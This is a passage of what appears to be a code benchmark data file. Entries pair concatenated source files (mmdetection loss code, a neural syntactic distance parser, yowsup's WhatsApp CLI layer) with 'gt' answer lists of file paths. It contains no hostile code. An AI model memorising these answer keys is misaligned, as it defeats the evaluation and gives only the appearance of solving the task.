\"\"\"MSELoss.\n\n    Args:\n        reduction (str, optional): The method that reduces the loss to a\n            scalar. Options are \"none\", \"mean\" and \"sum\".\n        loss_weight (float, optional): The weight of the loss. Defaults to 1.0\n    Forward function of loss.\n\n        Args:\n            pred (torch.Tensor): The prediction.\n            target (torch.Tensor): The learning target of the prediction.\n            weight (torch.Tensor, optional): Weight of the loss for each\n                prediction. Defaults to None.\n            avg_factor (int, optional): Average factor that is used to average\n                the loss. Defaults to None.\n            reduction_override (str, optional): The reduction method used to\n                override the original reduction method of the loss.\n                Defaults to None.\n\n        Returns:\n            torch.Tensor: The calculated loss\n        \"\"\"\n        assert reduction_override in (None, 'none', 'mean', 'sum')\n        reduction = (\n            reduction_override if reduction_override else self.reduction)\n        loss = self.loss_weight * mse_loss(\n            pred, target, weight, reduction=reduction, avg_factor=avg_factor)\n        return loss\n",
        "gt": [
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/losses/mse_loss.py'",
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/losses/__init__.py'",
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/roi_heads/dynamic_roi_head.py'",
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/roi_heads/__init__.py'",
            "'DSGN2/mmdetection-v2.22.0/tests/test_models/test_dense_heads/test_pisa_head.py'"
        ]
    },
    {
        "files": [
            "'distance-parser/src/model.py'",
            "'distance-parser/src/dp.py'",
            "'distance-parser/src/embed_regularize.py'",
            "'distance-parser/src/demo.py'"
        ],
        "content": "'distance-parser/src/model.py'\n:import numpy\nimport torch\nimport torch.nn as nn\nfrom torch.nn.utils.rnn import pack_padded_sequence, pad_packed_sequence\n\nfrom embed_regularize import embedded_dropout\nfrom weight_drop import WeightDrop\n\n\nclass Shuffle(nn.Module):\n    def __init__(self, permutation, contiguous=True):\n        super(Shuffle, self).__init__()\n        self.permutation = permutation\n        self.contiguous = contiguous\n\n    def forward(self, input):\n        shuffled = input.permute(*self.permutation)\n        if self.contiguous:\n            return shuffled.contiguous()\n        else:\n            return shuffled\n\n\nclass LayerNormalization(nn.Module):\n\n\n    def __init__(self, d_hid, eps=1e-3):\n        super(LayerNormalization, self).__init__()\n\n        self.eps = eps\n        self.a_2 = nn.Parameter(torch.ones(d_hid), requires_grad=True)\n        self.b_2 = nn.Parameter(torch.zeros(d_hid), requires_grad=True)\n\n    def forward(self, z):\n        if z.size(1) == 1:\n            return z\n\n        mu = torch.mean(z, keepdim=True, dim=-1)\n        sigma = torch.std(z, keepdim=True, dim=-1)\n        ln_out = (z - mu.expand_as(z)) / (sigma.expand_as(z) + self.eps)\n        ln_out = ln_out * self.a_2.expand_as(ln_out) + self.b_2.expand_as(ln_out)\n\n        return ln_out\n\n\nclass distance_parser(nn.Module):\n    def __init__(self,\n                 vocab_size, embed_size, hid_size,\n                 arc_size, stag_size, window_size,\n                 wordembed=None, dropout=0.2, dropoute=0.1, dropoutr=0.1):\n        super(distance_parser, self).__init__()\n        self.vocab_size = vocab_size\n        self.embed_size = embed_size\n        self.hid_size = hid_size\n        self.arc_size = arc_size\n        self.stag_size = stag_size\n        self.window_size = window_size\n        self.drop = nn.Dropout(dropout)\n        self.dropoute = dropoute\n        self.dropoutr = dropoutr\n        self.encoder = nn.Embedding(vocab_size, embed_size)\n        if wordembed is not None:\n            self.encoder.weight.data = torch.FloatTensor(wordembed)\n\n        self.tag_encoder = nn.Embedding(stag_size, embed_size)\n\n        self.word_rnn = nn.LSTM(2 * embed_size, hid_size, num_layers=2, batch_first=True, dropout=dropout,\n                                bidirectional=True)\n        self.word_rnn = WeightDrop(self.word_rnn, ['weight_hh_l0', 'weight_hh_l1'], dropout=dropoutr)\n\n        self.conv1 = nn.Sequential(nn.Dropout(dropout),\n                                   nn.Conv1d(hid_size * 2,\n                                             hid_size,\n                                             window_size),\n                                   nn.ReLU())\n\n        self.arc_rnn = nn.LSTM(hid_size, hid_size, num_layers=2, batch_first=True, dropout=dropout,\n                               bidirectional=True)\n        self.arc_rnn = WeightDrop(self.arc_rnn, ['weight_hh_l0', 'weight_hh_l1'], dropout=dropoutr)\n\n        self.distance = nn.Sequential(\n            nn.Dropout(dropout),\n            nn.Linear(hid_size * 2, hid_size),\n            nn.ReLU(),\n            nn.Dropout(dropout),\n            nn.Linear(hid_size, 1),\n        )\n\n        self.terminal = nn.Sequential(\n            nn.Dropout(dropout),\n            nn.Linear(hid_size * 2, hid_size),\n            nn.ReLU(),\n        )\n\n        self.non_terminal = nn.Sequential(\n            nn.Dropout(dropout),\n            nn.Linear(hid_size * 2, hid_size),\n            nn.ReLU(),\n        )\n\n        self.arc = nn.Sequential(\n            nn.Dropout(dropout),\n            nn.Linear(hid_size, arc_size),\n        )\n\n    def forward(self, words, stag, mask):\n\n\n        bsz, ntoken = words.size()\n        emb_words = embedded_dropout(self.encoder, words, dropout=self.dropoute if self.training else 0)\n        emb_words = self.drop(emb_words)\n\n        emb_stags = embedded_dropout(self.tag_encoder, stag, dropout=self.dropoute if self.training else 0)\n        emb_stags = self.drop(emb_stags)\n\n\n        def run_rnn(input, rnn, lengths):\n            sorted_idx = numpy.argsort(lengths)[::-1].tolist()\n            rnn_input = pack_padded_sequence(input[sorted_idx], lengths[sorted_idx], batch_first=True)\n            rnn_out, _ = rnn(rnn_input)\n            rnn_out, _ = pad_packed_sequence(rnn_out, batch_first=True)\n            rnn_out = rnn_out[numpy.argsort(sorted_idx).tolist()]\n\n            return rnn_out\n\n        sent_lengths = (mask.sum(dim=1)).data.cpu().numpy().astype('int')\n        dst_lengths = sent_lengths - 1\n        emb_plus_tag = torch.cat([emb_words, emb_stags], dim=-1)\n\n        rnn1_out = run_rnn(emb_plus_tag, self.word_rnn, sent_lengths)\n\n        terminal = self.terminal(rnn1_out.view(-1, self.hid_size*2))\n        tag = self.arc(terminal)\n\n        conv_out = self.conv1(rnn1_out.permute(0, 2, 1)).permute(0, 2, 1)\n        rnn2_out = run_rnn(conv_out, self.arc_rnn, dst_lengths)\n\n        non_terminal = self.non_terminal(rnn2_out.view(-1, self.hid_size*2))\n        distance = self.distance(rnn2_out.view(-1, self.hid_size*2)).squeeze(dim=-1)\n        arc = self.arc(non_terminal)\n        return distance.view(bsz, ntoken - 1), arc.contiguous().view(-1, self.arc_size), tag.view(-1, self.arc_size)\n\n'distance-parser/src/dp.py'\n:import argparse\nimport math\nimport os\nimport random\n\nimport torch.nn as nn\nfrom torch.optim.lr_scheduler import ReduceLROnPlateau\n\nfrom dataloader import PTBLoader\nfrom helpers import *\nfrom loss import *\nfrom model import distance_parser\n\n\ndef get_args():\n    parser = argparse.ArgumentParser(\n        description='Syntactic distance based neural parser')\n    parser.add_argument('--epc', type=int, default=100)\n    parser.add_argument('--lr', type=float, default=.001)\n    parser.add_argument('--bthsz', type=int, default=20)\n    parser.add_argument('--hidsz', type=int, default=1200)\n    parser.add_argument('--embedsz', type=int, default=400)\n    parser.add_argument('--window_size', type=int, default=2)\n    parser.add_argument('--dpout', type=float, default=0.3)\n    parser.add_argument('--dpoute', type=float, default=0.1)\n    parser.add_argument('--dpoutr', type=float, default=0.2)\n    parser.add_argument('--seed', type=int, default=1234)\n    parser.add_argument('--weight_decay', type=float, default=1e-6)\n    parser.add_argument('--use_glove', action='store_true')\n    parser.add_argument('--logfre', type=int, default=200)\n    parser.add_argument('--devfre', type=int, default=-1)\n    parser.add_argument('--cuda', action='store_true', dest='cuda')\n    parser.add_argument('--datapath', type=str, default='../data/ptb')\n    parser.add_argument('--savepath', type=str, default='../results')\n    parser.add_argument('--filename', type=str, default=None)\n\n    args = parser.parse_args()\n\n    random.seed(args.seed)\n    torch.random.manual_seed(args.seed)\n    if args.cuda and torch.cuda.is_available():\n        torch.cuda.random.manual_seed(args.seed)\n    return args\n\n\ndef evaluate(model, data, mode='valid'):\n    import tempfile\n    model.eval()\n    if mode == 'valid':\n        idxs, tags, stags, arcs, dsts = data.batchify(mode, 1)\n        _, _, _, _, _, sents, trees = data.valid\n    elif mode == 'test':\n        idxs, tags, stags, arcs, dsts = data.batchify(mode, 1)\n        _, _, _, _, _, sents, trees = data.test\n\n    temp_path = tempfile.TemporaryDirectory(prefix=\"evalb-\")\n    temp_file_path = os.path.join(temp_path.name, \"pred_trees.txt\")\n    temp_targ_path = os.path.join(temp_path.name, \"true_trees.txt\")\n    temp_eval_path = os.path.join(temp_path.name, \"evals.txt\")\n\n    print(\"Temp: {}, {}\".format(temp_file_path, temp_targ_path))\n    temp_tree_file = open(temp_file_path, \"w\")\n    temp_targ_file = open(temp_targ_path, \"w\")\n\n    set_loss = 0.0\n    set_counter = 0\n    set_arc_prec = 0.0\n    arc_counter = 0\n    set_tag_prec = 0.0\n    tag_counter = 0\n    for _, (idx, tag, stag, arc, dst, sent, tree) in enumerate(\n            zip(idxs, tags, stags, arcs, dsts, sents, trees)):\n\n        if args.cuda:\n            idx = idx.cuda()\n            tag = tag.cuda()\n            stag = stag.cuda()\n            arc = arc.cuda()\n            dst = dst.cuda()\n\n        mask = (idx >= 0).float()\n        idx = idx * mask.long()\n        dstmask = (dst > 0).float()\n        pred_dst, pred_arc, pred_tag = model(idx, stag, mask)\n\n        loss = rankloss(pred_dst, dst, dstmask)\n        set_loss += loss.item()\n        set_counter += 1\n\n        _, pred_arc_idx = torch.max(pred_arc, dim=-1)\n        arc_prec = ((arc == pred_arc_idx).float() * dstmask).sum()\n        set_arc_prec += arc_prec.item()\n        arc_counter += dstmask.sum().item()\n\n        _, pred_tag_idx = torch.max(pred_tag, dim=-1)\n        pred_tag_idx[0], pred_tag_idx[-1] = -1, -1\n        tag_prec = (tag == pred_tag_idx).float().sum()\n        set_tag_prec += tag_prec.item()\n        tag_counter += (tag != 0).float().sum().item()\n\n        pred_tree = build_nltktree(\n            pred_dst.data.squeeze().cpu().numpy().tolist()[1:-1],\n            pred_arc_idx.data.squeeze().cpu().numpy().tolist()[1:-1],\n            pred_tag_idx.data.squeeze().cpu().numpy().tolist()[1:-1],\n            sent,\n            ptb_parsed.arc_dictionary.idx2word,\n            ptb_parsed.arc_dictionary.idx2word,\n            ptb_parsed.stag_dictionary.idx2word,\n            stags=stag.data.squeeze().cpu().numpy().tolist()[1:-1]\n        )\n\n        def process_str_tree(str_tree):\n            return re.sub('[ |\\n]+', ' ', str_tree)\n\n        temp_tree_file.write(process_str_tree(str(pred_tree)) + '\\n')\n        temp_targ_file.write(process_str_tree(str(tree)) + '\\n')\n\n\n    temp_tree_file.close()\n    temp_targ_file.close()\n\n    evalb_dir = os.path.join(os.getcwd(), \"../EVALB\")\n    evalb_param_path = os.path.join(evalb_dir, \"COLLINS.prm\")\n    evalb_program_path = os.path.join(evalb_dir, \"evalb\")\n    command = \"{} -p {} {} {} > {}\".format(\n        evalb_program_path,\n        evalb_param_path,\n        temp_targ_path,\n        temp_file_path,\n        temp_eval_path)\n\n    import subprocess\n    subprocess.run(command, shell=True)\n    fscore = FScore(math.nan, math.nan, math.nan)\n\n    with open(temp_eval_path) as infile:\n        for line in infile:\n            match = re.match(r\"Bracketing Recall\\s+=\\s+(\\d+\\.\\d+)\", line)\n            if match:\n                fscore.recall = float(match.group(1))\n            match = re.match(r\"Bracketing Precision\\s+=\\s+(\\d+\\.\\d+)\", line)\n            if match:\n                fscore.precision = float(match.group(1))\n            match = re.match(r\"Bracketing FMeasure\\s+=\\s+(\\d+\\.\\d+)\", line)\n            if match:\n                fscore.fscore = float(match.group(1))\n                break\n\n    temp_path.cleanup()\n\n    set_loss /= set_counter\n    set_arc_prec /= arc_counter\n    set_tag_prec /= tag_counter\n\n    model.train()\n\n    return (set_loss, set_arc_prec, set_tag_prec,\n            fscore.precision, fscore.recall, fscore.fscore)\n\n\nargs = get_args()\n\nif args.filename is None:\n    filename = sorted(str(args)[10:-1].split(', '))\n    filename = [i for i in filename if ('dir' not in i) and\n                                       ('tblog' not in i) and\n                                       ('fre' not in i) and\n                                       ('cuda' not in i) and\n                                       ('nlookback' not in i)]\n    filename = __file__.split('.')[0].split('/')[-1] + '_' + \\\n               '_'.join(filename).replace('=', '') \\\n                                 .replace('/', '') \\\n                                 .replace('\\'', '') \\\n                                 .replace('..', '') \\\n                                 .replace('\\\"', '')\nelse:\n    filename = args.filename\n\nif not os.path.isdir(args.savepath):\n    os.mkdir(args.savepath)\nparameter_filepath = os.path.join(args.savepath, filename + '.th')\nprint('model parth:', parameter_filepath)\n\nprint(args)\nprint(\"loading data ...\")\nptb_parsed = PTBLoader(data_path=args.datapath, use_glove=args.use_glove)\n\nwordembed = ptb_parsed.wordembed_matrix\nargs.vocab_size = len(ptb_parsed.dictionary)\n\ntrain_log_template = 'epoch {:<3d} batch {:<4d} loss {:<.6f} rank {:<.6f} arc {:<.6f} tag {:<.6f}'\nvalid_log_template = \\\n    '*** epoch {:<3d}  \\tloss     \\tarc prec \\ttag prec \\tprecision\\trecall   \\tlf1      \\n' \\\n    '{:10}DEV\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}\\n' \\\n    '{:10}TEST\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}\\t{:<.6f}'\n\nif __name__ == '__main__':\n    print(\"building model...\")\n    model = distance_parser(vocab_size=args.vocab_size,\n                            embed_size=args.embedsz,\n                            hid_size=args.hidsz,\n                            arc_size=len(ptb_parsed.arc_dictionary),\n                            stag_size=len(ptb_parsed.stag_dictionary),\n                            window_size=args.window_size,\n                            dropout=args.dpout,\n                            dropoute=args.dpoute,\n                            dropoutr=args.dpoutr,\n                            wordembed=wordembed)\n    if args.cuda:\n        model.cuda()\n\n    optimizer = torch.optim.Adam(model.parameters(), lr=args.lr, betas=(0, 0.999),\n                                 weight_decay=args.weight_decay)\n    scheduler = ReduceLROnPlateau(optimizer, mode='max', patience=2, factor=0.5, min_lr=0.000001)\n\n    print(\" \")\n    numparams = sum([numpy.prod(i.size()) for i in model.parameters()])\n    print(\"Number of params: {0}\\n{1:35}{2:35}Size\".format(\n        numparams, 'Name', 'Shape'))\n    print(\"---------------------------------------------------------------------------\")\n    for item in model.state_dict().keys():\n        this_param = model.state_dict()[item]\n        print(\"{:60}{!s:35}{}\".format(\n            item, this_param.size(), numpy.prod(this_param.size())))\n    print(\" \")\n\n\n    best_valid_f1 = 0.0\n    start_epoch = 0\n\n    print(\"training ...\")\n\n    train_idxs, train_tags, train_stags, \\\n    train_arcs, train_distances, \\\n    train_sents, train_trees = ptb_parsed.batchify('train', args.bthsz)\n    if args.devfre == -1:\n        args.devfre = len(train_idxs)\n\n    for epoch in range(start_epoch, start_epoch + args.epc):\n        inds = list(range(len(train_idxs)))\n        random.shuffle(inds)\n        epc_train_idxs = [train_idxs[i] for i in inds]\n        epc_train_tags = [train_tags[i] for i in inds]\n        epc_train_stags = [train_stags[i] for i in inds]\n        epc_train_arcs = [train_arcs[i] for i in inds]\n        epc_train_distances = [train_distances[i] for i in inds]\n\n        for ibatch, (idx, tag, stag, arc, dst) in \\\n                enumerate(\n                    zip(\n                        epc_train_idxs,\n                        epc_train_tags,\n                        epc_train_stags,\n                        epc_train_arcs,\n                        epc_train_distances,\n                    )):\n\n            if args.cuda:\n                idx = idx.cuda()\n                tag = tag.cuda()\n                stag = stag.cuda()\n                arc = arc.cuda()\n                dst = dst.cuda()\n\n            mask = (idx >= 0).float()\n            idx = idx * mask.long()\n            dstmask = (dst > 0).float()\n\n            optimizer.zero_grad()\n            pred_dst, pred_arc, pred_tag = model(idx, stag, mask)\n            loss_rank = rankloss(pred_dst, dst, dstmask)\n            loss_arc = arcloss(pred_arc, arc.view(-1))\n            loss_tag = tagloss(pred_tag, tag.view(-1))\n\n            loss = loss_rank + loss_arc + loss_tag\n            loss.backward()\n\n            nn.utils.clip_grad_norm_(model.parameters(), 1.)\n            optimizer.step()\n\n            if (ibatch + 1) % args.logfre == 0:\n                print(train_log_template.format(epoch, ibatch + 1, loss.item(),\n                                                loss_rank.item(), loss_arc.item(),\n                                                loss_tag.item()))\n\n\n\n        print(\"Evaluating valid... \")\n        valid_loss, valid_arc_prec, valid_tag_prec, \\\n        valid_precision, valid_recall, valid_f1 = evaluate(model, ptb_parsed, 'valid')\n        print(\"Evaluating test... \")\n        test_loss, test_arc_prec, test_tag_prec, \\\n        test_precision, test_recall, test_f1 = evaluate(model, ptb_parsed, 'test')\n        print(valid_log_template.format(\n            epoch,\n            ' ', valid_loss, valid_arc_prec, valid_tag_prec,\n            valid_precision, valid_recall, valid_f1,\n            ' ', test_loss, test_arc_prec, test_tag_prec,\n            test_precision, test_recall, test_f1))\n\n        if valid_f1 > best_valid_f1:\n            best_valid_f1 = valid_f1\n            torch.save({\n                'epoch': epoch,\n                'valid_loss': valid_loss,\n                'valid_precision': valid_precision,\n                'valid_recall': valid_recall,\n                'valid_f1': valid_f1,\n                'model_state_dict': model.state_dict(),\n                'optimizer': optimizer.state_dict(),\n            }, parameter_filepath)\n\n        scheduler.step(valid_f1)\n\n'distance-parser/src/embed_regularize.py'\n:import numpy as np\nimport torch\nfrom torch.autograd import Variable\nimport torch.nn.functional as F\n\n\ndef embedded_dropout(embed, words, dropout=0.1, scale=None):\n  if dropout:\n    mask = embed.weight.data.new().resize_((embed.weight.size(0), 1)).bernoulli_(1 - dropout).expand_as(embed.weight) / (1 - dropout)\n    mask = Variable(mask)\n    masked_embed_weight = mask * embed.weight\n  else:\n    masked_embed_weight = embed.weight\n  if scale:\n    masked_embed_weight = scale.expand_as(masked_embed_weight) * masked_embed_weight\n\n  padding_idx = embed.padding_idx\n  if padding_idx is None:\n      padding_idx = -1\n  return F.embedding(words, masked_embed_weight,\n    padding_idx, embed.max_norm, embed.norm_type,\n    embed.scale_grad_by_freq, embed.sparse\n  )\n\n\n\n'distance-parser/src/demo.py'\n:from dp import *\n\nif __name__ == '__main__':\n    print(\"building model...\")\n    model = distance_parser(vocab_size=args.vocab_size,\n                            embed_size=args.embedsz,\n                            hid_size=args.hidsz,\n                            arc_size=len(ptb_parsed.arc_dictionary),\n                            stag_size=len(ptb_parsed.stag_dictionary),\n                            window_size=args.window_size,\n                            dropout=args.dpout,\n                            dropoute=args.dpoute,\n                            dropoutr=args.dpoutr)\n    if args.cuda:\n        model.cuda()\n\n    if os.path.isfile(parameter_filepath):\n        print(\"Resuming from file: {}\".format(parameter_filepath))\n        checkpoint = torch.load(parameter_filepath)\n        start_epoch = checkpoint['epoch']\n        valid_precision = checkpoint['valid_precision']\n        valid_recall = checkpoint['valid_recall']\n        best_valid_f1 = checkpoint['valid_f1']\n        model.load_state_dict(checkpoint['model_state_dict'])\n        print(\"loaded model: epoch {}, valid_loss {}, \"\n              \"valid_precision {}, valid_recall {}, valid_f1 {}\".format(\n            start_epoch, checkpoint['valid_loss'], valid_precision, \\\n            valid_recall, best_valid_f1))\n\n    print(\"Evaluating valid... \")\n    valid_loss, valid_arc_prec, valid_tag_prec, \\\n    valid_precision, valid_recall, valid_f1 = evaluate(model, ptb_parsed, 'valid')\n    print(\"Evaluating test... \")\n    test_loss, test_arc_prec, test_tag_prec, \\\n    test_precision, test_recall, test_f1= evaluate(model, ptb_parsed, 'test')\n    print(valid_log_template.format(\n        start_epoch,\n        ' ', valid_loss, valid_arc_prec, valid_tag_prec,\n        valid_precision, valid_recall, valid_f1,\n        ' ', test_loss, test_arc_prec, test_tag_prec,\n        test_precision, test_recall, test_f1))",
        "gt": [
            "'distance-parser/src/embed_regularize.py'",
            "'distance-parser/src/model.py'",
            "'distance-parser/src/dp.py'",
            "'distance-parser/src/demo.py'"
        ]
    },
    {
        "files": [
            "'yowsup/yowsup/demos/cli/__init__.py'",
            "'yowsup/yowsup/demos/cli/layer.py'",
            "'yowsup/yowsup/demos/cli/stack.py'",
            "'yowsup/yowsup/layers/protocol_contacts/protocolentities/__init__.py'"
        ],
        "content": "'yowsup/yowsup/demos/cli/__init__.py'\n:from .stack import YowsupCliStack\n\n'yowsup/yowsup/demos/cli/layer.py'\n:from .cli import Cli, clicmd\nfrom yowsup.layers.interface import YowInterfaceLayer, ProtocolEntityCallback\nfrom yowsup.layers import YowLayerEvent, EventCallback\nfrom yowsup.layers.network import YowNetworkLayer\nimport sys\nfrom yowsup.common import YowConstants\nimport datetime\nimport time\nimport os\nimport logging\nimport threading\nimport base64\nfrom yowsup.layers.protocol_groups.protocolentities      import *\nfrom yowsup.layers.protocol_presence.protocolentities    import *\nfrom yowsup.layers.protocol_messages.protocolentities    import *\nfrom yowsup.layers.protocol_ib.protocolentities          import *\nfrom yowsup.layers.protocol_iq.protocolentities          import *\nfrom yowsup.layers.protocol_contacts.protocolentities    import *\nfrom yowsup.layers.protocol_chatstate.protocolentities   import *\nfrom yowsup.layers.protocol_privacy.protocolentities     import *\nfrom yowsup.layers.protocol_media.protocolentities       import *\nfrom yowsup.layers.protocol_media.mediauploader import MediaUploader\nfrom yowsup.layers.protocol_profiles.protocolentities    import *\nfrom yowsup.common.tools import Jid\nfrom yowsup.common.optionalmodules import PILOptionalModule\nfrom yowsup.layers.axolotl.protocolentities.iq_key_get import GetKeysIqProtocolEntity\n\nlogger = logging.getLogger(__name__)\nclass YowsupCliLayer(Cli, YowInterfaceLayer):\n    PROP_RECEIPT_AUTO       = \"org.openwhatsapp.yowsup.prop.cli.autoreceipt\"\n    PROP_RECEIPT_KEEPALIVE  = \"org.openwhatsapp.yowsup.prop.cli.keepalive\"\n    PROP_CONTACT_JID        = \"org.openwhatsapp.yowsup.prop.cli.contact.jid\"\n    EVENT_LOGIN             = \"org.openwhatsapp.yowsup.event.cli.login\"\n    EVENT_START             = \"org.openwhatsapp.yowsup.event.cli.start\"\n    EVENT_SENDANDEXIT       = \"org.openwhatsapp.yowsup.event.cli.sendandexit\"\n\n    MESSAGE_FORMAT          = \"[%s(%s)]:[%s]\\t %s\"\n\n    FAIL_OPT_PILLOW         = \"No PIL library installed, try install pillow\"\n    FAIL_OPT_AXOLOTL        = \"axolotl is not installed, try install python-axolotl\"\n\n    DISCONNECT_ACTION_PROMPT = 0\n    DISCONNECT_ACTION_EXIT   = 1\n\n    ACCOUNT_DEL_WARNINGS = 4\n\n    def __init__(self):\n        super(YowsupCliLayer, self).__init__()\n        YowInterfaceLayer.__init__(self)\n        self.accountDelWarnings = 0\n        self.connected = False\n        self.username = None\n        self.sendReceipts = True\n        self.sendRead = True\n        self.disconnectAction = self.__class__.DISCONNECT_ACTION_PROMPT\n\n\n\n\n        self.jidAliases = {\n\n        }\n\n    def aliasToJid(self, calias):\n        for alias, ajid in self.jidAliases.items():\n            if calias.lower() == alias.lower():\n                return Jid.normalize(ajid)\n\n        return Jid.normalize(calias)\n\n    def jidToAlias(self, jid):\n        for alias, ajid in self.jidAliases.items():\n            if ajid == jid:\n                return alias\n        return jid\n\n    @EventCallback(EVENT_START)\n    def onStart(self, layerEvent):\n        self.startInput()\n        return True\n\n    @EventCallback(YowNetworkLayer.EVENT_STATE_DISCONNECTED)\n    def onStateDisconnected(self,layerEvent):\n        self.output(\"Disconnected: %s\" % layerEvent.getArg(\"reason\"))\n        if self.disconnectAction == self.__class__.DISCONNECT_ACTION_PROMPT:\n           self.connected = False\n           self.notifyInputThread()\n        else:\n           os._exit(os.EX_OK)\n\n    def assertConnected(self):\n        if self.connected:\n            return True\n        else:\n            self.output(\"Not connected\", tag = \"Error\", prompt = False)\n            return False\n\n\n    @clicmd(\"Set presence name\")\n    def presence_name(self, name):\n        if self.assertConnected():\n            entity = PresenceProtocolEntity(name = name)\n            self.toLower(entity)\n\n    @clicmd(\"Set presence as available\")\n    def presence_available(self):\n        if self.assertConnected():\n            entity = AvailablePresenceProtocolEntity()\n            self.toLower(entity)\n\n    @clicmd(\"Set presence as unavailable\")\n    def presence_unavailable(self):\n        if self.assertConnected():\n            entity = UnavailablePresenceProtocolEntity()\n            self.toLower(entity)\n\n    @clicmd(\"Unsubscribe from contact's presence updates\")\n    def presence_unsubscribe(self, contact):\n        if self.assertConnected():\n            entity = UnsubscribePresenceProtocolEntity(self.aliasToJid(contact))\n            self.toLower(entity)\n\n    @clicmd(\"Subscribe to contact's presence updates\")\n    def presence_subscribe(self, contact):\n        if self.assertConnected():\n            entity = SubscribePresenceProtocolEntity(self.aliasToJid(contact))\n            self.toLower(entity)\n\n\n\n\n    @clicmd(\"Send clean dirty\")\n    def ib_clean(self, dirtyType):\n        if self.assertConnected():\n            entity = CleanIqProtocolEntity(\"groups\", YowConstants.DOMAIN)\n            self.toLower(entity)\n\n    @clicmd(\"Ping server\")\n    def ping(self):\n        if self.assertConnected():\n            entity = PingIqProtocolEntity(to = YowConstants.DOMAIN)\n            self.toLower(entity)\n\n\n\n\n    @clicmd(\"Set status text\")\n    def profile_setStatus(self, text):\n        if self.assertConnected():\n\n            def onSuccess(resultIqEntity, originalIqEntity):\n                self.output(\"Status updated successfully\")\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error updating status\")\n\n            entity = SetStatusIqProtocolEntity(text)\n            self._sendIq(entity, onSuccess, onError)\n\n    @clicmd(\"Get profile picture for contact\")\n    def contact_picture(self, jid):\n        if self.assertConnected():\n            entity = GetPictureIqProtocolEntity(self.aliasToJid(jid), preview=False)\n            self._sendIq(entity, self.onGetContactPictureResult)\n\n    @clicmd(\"Get profile picture preview for contact\")\n    def contact_picturePreview(self, jid):\n        if self.assertConnected():\n            entity = GetPictureIqProtocolEntity(self.aliasToJid(jid), preview=True)\n            self._sendIq(entity, self.onGetContactPictureResult)\n\n    @clicmd(\"Get lastseen for contact\")\n    def contact_lastseen(self, jid):\n        if self.assertConnected():\n            def onSuccess(resultIqEntity, originalIqEntity):\n                self.output(\"%s lastseen %s seconds ago\" % (resultIqEntity.getFrom(), resultIqEntity.getSeconds()))\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error getting lastseen information for %s\" % originalIqEntity.getTo())\n\n            entity = LastseenIqProtocolEntity(self.aliasToJid(jid))\n            self._sendIq(entity, onSuccess, onError)\n\n    @clicmd(\"Set profile picture\")\n    def profile_setPicture(self, path):\n        if self.assertConnected():\n            with PILOptionalModule(failMessage = \"No PIL library installed, try install pillow\") as imp:\n                Image = imp(\"Image\")\n                def onSuccess(resultIqEntity, originalIqEntity):\n                    self.output(\"Profile picture updated successfully\")\n\n                def onError(errorIqEntity, originalIqEntity):\n                    logger.error(\"Error updating profile picture\")\n\n\n\n                src = Image.open(path)\n                pictureData = src.resize((640, 640)).tobytes(\"jpeg\", \"RGB\")\n                picturePreview = src.resize((96, 96)).tobytes(\"jpeg\", \"RGB\")\n                iq = SetPictureIqProtocolEntity(self.getOwnJid(), picturePreview, pictureData)\n                self._sendIq(iq, onSuccess, onError)\n\n    @clicmd(\"Get profile privacy\")\n    def profile_getPrivacy(self):\n        if self.assertConnected():\n            def onSuccess(resultIqEntity, originalIqEntity):\n                self.output(\"Profile privacy is: %s\" %(resultIqEntity))\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error getting profile privacy\")\n\n            iq = GetPrivacyIqProtocolEntity()\n            self._sendIq(iq, onSuccess, onError)\n\n    @clicmd(\"Profile privacy. value=all|contacts|none names=profile|status|last. Names are comma separated, defaults to all.\")\n    def profile_setPrivacy(self, value=\"all\", names=None):\n        if self.assertConnected():\n            def onSuccess(resultIqEntity, originalIqEntity):\n                self.output(\"Profile privacy set to: %s\" %(resultIqEntity))\n\n            def onError(errorIqEntity, originalIqEntity):\n                logger.error(\"Error setting profile privacy\")\n            try:\n                names = [name for name in names.split(',')] if names else None\n                iq = SetPrivacyIqProtocolEntity(value, names)\n                self._sendIq(iq, onSuccess, onError)\n            except Exception as inst:\n                self.output(inst.message)\n                return self.print_usage()\n\n\n\n\n    @clicmd(\"List all groups you belong to\", 5)\n    def groups_list(self):\n        if self.assertConnected():\n            entity = ListGroupsIqProtocolEntity()\n            self.toLower(entity)\n\n    @clicmd(\"Leave a group you belong to\", 4)\n    def group_leave(self, group_jid):\n        if self.assertConnected():\n            entity = LeaveGroupsIqProtocolEntity([self.aliasToJid(group_jid)])\n            self.toLower(entity)\n\n    @clicmd(\"Create a new group with the specified subject and participants. Jids are a comma separated list but optional.\", 3)\n    def groups_create(self, subject, jids = None):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')] if jids else []\n            entity = CreateGroupsIqProtocolEntity(subject, participants=jids)\n            self.toLower(entity)\n\n    @clicmd(\"Invite to group. Jids are a comma separated list\")\n    def group_invite(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = AddParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Promote admin of a group. Jids are a comma separated list\")\n    def group_promote(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = PromoteParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Remove admin of a group. Jids are a comma separated list\")\n    def group_demote(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = DemoteParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Kick from group. Jids are a comma separated list\")\n    def group_kick(self, group_jid, jids):\n        if self.assertConnected():\n            jids = [self.aliasToJid(jid) for jid in jids.split(',')]\n            entity = RemoveParticipantsIqProtocolEntity(self.aliasToJid(group_jid), jids)\n            self.toLower(entity)\n\n    @clicmd(\"Change group subject\")\n    def group_setSubject(self, group_jid, subject):\n        if self.assertConnected():\n            entity = 